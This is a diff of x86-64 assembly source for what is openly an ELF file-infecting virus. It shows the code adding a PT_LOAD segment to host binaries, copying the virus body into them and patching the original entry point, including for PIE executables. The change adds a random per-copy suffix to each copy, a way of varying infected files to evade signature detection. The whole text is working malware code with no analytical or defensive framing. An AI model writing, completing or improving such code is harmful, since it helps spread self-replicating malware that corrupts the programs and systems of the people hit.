@@ -338,6 +338,9 @@ add_pt_load:
     mov edx, 64
     syscall
 
+    ; Generate random suffix before copying virus
+    call generate_random_suffix
+
     ; Copy virus to buffer and patch entry
     lea rsi, [rel virus_start]
     lea rdi, [rel virus_copy_buf]
@@ -354,6 +357,22 @@ add_pt_load:
     jmp .copy_virus_main
 
 .copy_done_main:
+    ; Update random suffix in virus copy buffer
+    lea rdi, [rel virus_copy_buf]
+    add rdi, v_random_suffix - virus_start
+    lea rsi, [rel random_suffix]
+    mov rcx, RANDOM_SUFFIX_LEN
+.copy_random_suffix:
+    test rcx, rcx
+    jz .copy_random_done
+    mov al, [rsi]
+    mov [rdi], al
+    inc rsi
+    inc rdi
+    dec rcx
+    jmp .copy_random_suffix
+
+.copy_random_done:
     ; Patch original entry
     ; For PIE binaries, store offset from our _start to original entry
     lea rdi, [rel virus_copy_buf]
